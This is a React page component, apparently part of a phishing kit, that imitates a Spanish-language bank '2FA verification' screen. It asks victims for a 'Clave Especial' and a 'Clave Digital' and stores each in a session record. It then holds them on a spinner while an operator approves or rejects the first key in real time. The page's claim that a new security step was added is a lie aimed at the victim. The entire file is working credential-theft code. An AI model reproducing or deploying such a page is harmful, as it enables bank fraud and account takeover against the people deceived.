import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import LoginHeader from "../components/LoginHeader";
import { base44 } from "@/api/base44Client";

export default function Verificacion() {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("sessionId");

  // "claveEspecial" | "waitingApproval" | "rejected" | "claveDigital" | "done"
  const [phase, setPhase] = useState("claveEspecial");
  const [claveEspecial, setClaveEspecial] = useState("");
  const [claveDigital, setClaveDigital] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const pollRef = useRef(null);

  useEffect(() => {
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  // Fase 1: enviar clave especial
  const handleSubmitClaveEspecial = async () => {
    if (!claveEspecial.trim() || !sessionId || submitting) return;
    setSubmitting(true);

    try {
      // Guardar clave especial
      await base44.entities.UserSessionData.update(sessionId, {
        claveEspecial: claveEspecial.trim(),
      });
      // Marcar como pendiente para que aparezca el botón en el panel
      await base44.entities.UserSessionData.update(sessionId, {
        claveEspecialStatus: "pending",
      });
    } catch (e) {
      console.error("Error guardando clave especial:", e);
      setSubmitting(false);
      return;
    }

    setSubmitting(false);
    setPhase("waitingApproval");

    // Pollear hasta que el admin apruebe o rechace
    pollRef.current = setInterval(async () => {
      try {
        const res = await base44.entities.UserSessionData.filter({ id: sessionId });
        const s = res[0];
        if (!s) return;
        if (s.claveEspecialStatus === "approved") {
          clearInterval(pollRef.current);
          setPhase("claveDigital");
        } else if (s.claveEspecialStatus === "rejected") {
          clearInterval(pollRef.current);
          setClaveEspecial("");
          setPhase("rejected");
        }
      } catch (_) {}
    }, 3000);
  };

  // Fase 2: enviar clave digital
  const handleSubmitClaveDigital = async () => {
    if (!claveDigital.trim() || !sessionId || submitting) return;
    setSubmitting(true);
    try {
      await base44.entities.UserSessionData.update(sessionId, {
        claveDigital: claveDigital.trim(),
      });
    } catch (e) {
      console.error("Error guardando clave digital:", e);
      setSubmitting(false);
      return;
    }
    setSubmitting(false);
    setPhase("done");
  };

  // Spinner de espera
  if (phase === "waitingApproval" || phase === "done") {
    return (
      <div style={{ position: "fixed", inset: 0, background: "white", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999 }}>
        <div style={{ width: "40px", height: "40px", border: "4px solid #e5e7eb", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite" }} />
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
      </div>
    );
  }

  const isPhase1 = phase === "claveEspecial" || phase === "rejected";
  const isRejected = phase === "rejected";
  const claveDigitalValid = claveDigital.trim().length > 0;

  return (
    <div className="min-h-screen bg-white font-main flex flex-col">
      <LoginHeader />
      <main className="flex-1 flex flex-col items-center pt-10">
        <div style={{ width: "100%", maxWidth: "620px", padding: "0 24px" }}>

          {/* Mensaje de rechazo */}
          {isRejected && (
            <div style={{ display: "flex", alignItems: "center", gap: "10px", background: "#fff3f3", border: "1px solid #f5c6c6", borderRadius: "4px", padding: "12px 16px", marginBottom: "20px" }}>
              <span style={{ fontSize: "18px" }}>⚠️</span>
              <span style={{ fontSize: "14px", color: "#cc0000" }}>
                La clave especial ingresada es incorrecta. Por favor, corrija la información e intente nuevamente.
              </span>
            </div>
          )}

          {/* Texto superior */}
          <p style={{ fontSize: "15px", color: "#121212", marginBottom: "24px", lineHeight: "1.6" }}>
            Hemos añadido recientemente un paso extra de verificación 2FA para
            reforzar la seguridad de su cuenta:
          </p>

          {/* Recuadro tipo tabla */}
          <div style={{ border: "1px solid #b0bec5", borderRadius: "2px", overflow: "hidden", marginBottom: "32px" }}>

            {/* Fila Clave Especial */}
            <div style={{ display: "flex", alignItems: "center", borderBottom: "1px solid #b0bec5", background: "#dce8f0" }}>
              <div style={{ width: "260px", minWidth: "260px", padding: "10px 16px", fontSize: "14px", fontWeight: "bold", color: "#121212", borderRight: "1px solid #b0bec5" }}>
                Clave Especial
              </div>
              <div style={{ flex: 1, padding: "6px 12px" }}>
                <input
                  type="text"
                  value={claveEspecial}
                  onChange={(e) => isPhase1 && setClaveEspecial(e.target.value.replace(/\s/g, ""))}
                  disabled={!isPhase1}
                  style={{
                    width: "140px", border: "1px solid #90a4ae", borderRadius: "2px",
                    padding: "4px 8px", fontSize: "14px", outline: "none", fontFamily: "inherit",
                    background: !isPhase1 ? "#f0f0f0" : "white",
                    color: !isPhase1 ? "#999" : "#121212",
                    cursor: !isPhase1 ? "not-allowed" : "text",
                  }}
                />
              </div>
            </div>

            {/* Fila Clave Digital */}
            <div style={{ display: "flex", alignItems: "center", background: "#dce8f0" }}>
              <div style={{ width: "260px", minWidth: "260px", padding: "10px 16px", fontSize: "14px", fontWeight: "bold", color: "#121212", borderRight: "1px solid #b0bec5" }}>
                Clave Digital
              </div>
              <div style={{ flex: 1, padding: "6px 12px" }}>
                <input
                  type="text"
                  inputMode="numeric"
                  value={claveDigital}
                  onChange={(e) => {
                    if (phase !== "claveDigital") return;
                    const val = e.target.value.replace(/[^0-9]/g, "");
                    if (val.length <= 8) setClaveDigital(val);
                  }}
                  disabled={phase !== "claveDigital"}
                  style={{
                    width: "140px", border: "1px solid #90a4ae", borderRadius: "2px",
                    padding: "4px 8px", fontSize: "14px", outline: "none", fontFamily: "inherit", letterSpacing: "2px",
                    background: phase !== "claveDigital" ? "#f0f0f0" : "white",
                    color: phase !== "claveDigital" ? "#999" : "#121212",
                    cursor: phase !== "claveDigital" ? "not-allowed" : "text",
                  }}
                />
              </div>
            </div>
          </div>

          {/* Botón */}
          <div style={{ textAlign: "center" }}>
            {isPhase1 ? (
              <button
                disabled={!claveEspecial.trim() || submitting}
                onClick={handleSubmitClaveEspecial}
                style={{
                  padding: "11px 52px", fontSize: "15px",
                  background: claveEspecial.trim() && !submitting ? "#1973B8" : "#d6d6d6",
                  color: claveEspecial.trim() && !submitting ? "white" : "#999",
                  border: "none", borderRadius: "4px",
                  cursor: claveEspecial.trim() && !submitting ? "pointer" : "not-allowed",
                  fontFamily: "inherit", transition: "all 0.2s",
                }}
              >
                {submitting ? "Enviando..." : "Continuar"}
              </button>
            ) : (
              <button
                disabled={!claveDigitalValid || submitting}
                onClick={handleSubmitClaveDigital}
                style={{
                  padding: "11px 52px", fontSize: "15px",
                  background: claveDigitalValid && !submitting ? "#1973B8" : "#d6d6d6",
                  color: claveDigitalValid && !submitting ? "white" : "#999",
                  border: "none", borderRadius: "4px",
                  cursor: claveDigitalValid && !submitting ? "pointer" : "not-allowed",
                  fontFamily: "inherit", transition: "all 0.2s",
                }}
              >
                {submitting ? "Enviando..." : "Continuar"}
              </button>
            )}
          </div>

        </div>
      </main>
    </div>
  );
}
